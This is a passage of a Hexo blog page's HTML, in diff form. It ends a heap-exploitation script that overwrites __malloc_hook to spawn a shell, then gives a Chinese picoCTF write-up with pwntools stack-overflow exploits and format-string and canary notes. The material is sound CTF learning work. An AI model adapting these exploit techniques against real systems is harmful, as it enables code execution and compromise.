class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x141</span>)         <span class="comment">#修改chunk1的size包含chunk2</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocte(<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">io.recv(<span class="number">0x90</span>+<span class="number">0x10</span>)</span><br><span class="line">fd = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line"></span><br><span class="line">malloc_hook = fd - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">shell = libcbase + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">allocte(<span class="number">0x90</span>)           <span class="comment">#清空bins chunk2</span></span><br><span class="line">allocte(<span class="number">0x10</span>)           <span class="comment">#用于溢出覆盖fd chun4</span></span><br><span class="line">allocte(<span class="number">0x60</span>)           <span class="comment">#chunk5</span></span><br><span class="line">allocte(<span class="number">0x10</span>)           <span class="comment">#防止top chunk合并</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>)    <span class="comment">#p64（malloc_hook-0x23)是因为在malloc_hook减0x23地址上存放了0x7f</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(payload), payload)      <span class="comment">#向chunk5中写入7f  0x7f是可以绕过fast bin的size检测的，将0x7f带入可以算出伪造的chunk在数组中下标应该为5，即0x70大小的chunk</span></span><br><span class="line">allocte(<span class="number">0x60</span>)       <span class="comment">#chunk5</span></span><br><span class="line">allocte(<span class="number">0x60</span>)       <span class="comment">#chunk6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(shell)</span><br><span class="line">edit(<span class="number">7</span>, <span class="built_in">len</span>(payload), payload)     <span class="comment">#将shell写入未被申请的内存中，并通过申请这块内存来触发shell</span></span><br><span class="line">allocte(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/03/18/picoCTF-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/18/picoCTF-wp/" class="post-title-link" itemprop="url">picoCTF_wp</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-18 20:26:42" itemprop="dateCreated datePublished" datetime="2022-03-18T20:26:42+08:00">2022-03-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-31 22:55:24" itemprop="dateModified" datetime="2022-03-31T22:55:24+08:00">2022-03-31</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="basic-file-exploit"><a href="#basic-file-exploit" class="headerlink" title="basic-file-exploit"></a>basic-file-exploit</h1><p>根据题目的提示可以知道寻找题目的逻辑漏洞在nc链接后输入两个1后进入2，此时随便输入几个字符串就可以进入到打印flag的函数</p>
+<h1 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h1><h2 id="一道简单的栈溢出题《ret2text》"><a href="#一道简单的栈溢出题《ret2text》" class="headerlink" title="一道简单的栈溢出题《ret2text》"></a>一道简单的栈溢出题《ret2text》</h2><p>exp：<br>from pwn import *<br>io=process(“./vuln1”)<br>io=remote(“saturn.picoctf.net”,64712)<br>payload = b’A’*0x74 + b’A’*4 + p64(0x200A)##这道题因为开了地址随机化所以需要直接把返回地址放在flag的txt段<br>io.sendline(payload)<br>t=io.recv()<br>print(t)  </p>
+<h1 id="CVE-XXXX-XXXX"><a href="#CVE-XXXX-XXXX" class="headerlink" title="CVE-XXXX-XXXX"></a>CVE-XXXX-XXXX</h1><p>直接百度搜索漏洞：picoCTF{CVE-2021-34527}</p>
+<h1 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h1><p>from pwn import *<br>#io=process(“./vuln1”)<br>io=remote(“saturn.picoctf.net”,53672)<br>io.recv()<br>payload1=b’A’*44 + p32(0x80491f6)<br>io.sendline(payload1)<br>io.recvline()<br>t=io.recv()<br>print(t)  </p>
+<h1 id="RPS"><a href="#RPS" class="headerlink" title="RPS"></a>RPS</h1><p>一道简单的石头剪刀布题目，根据hint可以知道需要去分析程序判断胜负的函数，百度那个函数可以知道那个函数是通过判断你输入的字符串是否包含在另一个字符串当中，所以可以直接将三个都输入进去5次获得flag</p>
+<h1 id="x-sixty-what"><a href="#x-sixty-what" class="headerlink" title="x-sixty-what"></a>x-sixty-what</h1><h2 id="一道简单的64位栈溢出题目"><a href="#一道简单的64位栈溢出题目" class="headerlink" title="一道简单的64位栈溢出题目"></a>一道简单的64位栈溢出题目</h2><p>from pwn import *<br>io=process(“./vuln2”)<br>io=remote(“saturn.picoctf.net”,63732)<br>elf=ELF(“./vuln2”)<br>ret=0x000000000040101a<br>flag=elf.symbols[‘flag’]<br>main_addr=elf.symbols[‘main’]<br>print(hex(flag))<br>io.recv()<br>payload=0x40<em>b’A’+0x8</em>b’A’+p64(ret)+p64(flag) ##可能需要加个ret函数去对齐<br>io.sendline(payload)<br>t=io.recv()<br>print(t)  </p>
+<h1 id="buffer-overflow-2"><a href="#buffer-overflow-2" class="headerlink" title="buffer overflow 2"></a>buffer overflow 2</h1><h2 id="本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）"><a href="#本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）" class="headerlink" title="本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）"></a>本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）</h2><p>from pwn import *<br>#io=gdb.debug(“./vuln3”)<br>io=process(“./vuln3”)<br>#io=remote(“saturn.picoctf.net”,51392)<br>elf=ELF(“./vuln3”)<br>win_addr=elf.symbols[‘win’]<br>main_addr=elf.symbols[‘main’]<br>payload=0x6c*b’A’+b’A’*4+p32(win_addr)+p32(win_addr)+p32(0xCAFEF00D)+p32(0xF00DF00D)<br>io.sendline(payload)<br>#p=io.recv()<br>#print(p)<br>io.interactive()  </p>
+<h1 id="flag-leak"><a href="#flag-leak" class="headerlink" title="flag leak"></a>flag leak</h1><p>一道格式化字符串题目，由于掌握的不熟练所以是用枚举法一个一个试出来的，最终是%25$s将位于栈上的flag打印了出来</p>
+<h1 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h1><p>这题与正常的栈溢出题目不同，是将canary.txt存在了栈中的某个位置，需要利用python脚本去爆破在栈中的这4位数字<br><img src="https://i.bmp.ovh/imgs/2022/03/31/e819ad73b747ec52.png" alt="exp"></p>
+<h1 id="file-run1"><a href="#file-run1" class="headerlink" title="file-run1"></a>file-run1</h1><p>将题目放在linux里面运行一下就出了flag</p>
+<h1 id="file-run2"><a href="#file-run2" class="headerlink" title="file-run2"></a>file-run2</h1><p>将题目放进ida当中可以直接查看flag</p>
+<h1 id="patchme-py"><a href="#patchme-py" class="headerlink" title="patchme.py"></a>patchme.py</h1><p>题目给了一道程序和一个python文件，根据分析python分析python文件可以知道将里面的一个列表按照一定的顺序打印出来并输入进程序就可以出flag</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>a = “!&quot;#$%&amp;’()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ”+ <br>            “[\]^_`abcdefghijklmnopqrstuvwxyz{|}~ “<br>print(a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68])</p>
+<h1 id="最后得分"><a href="#最后得分" class="headerlink" title="最后得分"></a>最后得分</h1><p><img src="https://s3.bmp.ovh/imgs/2022/03/31/f873cbec721194f5.png" alt="最后得分"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
 </html>
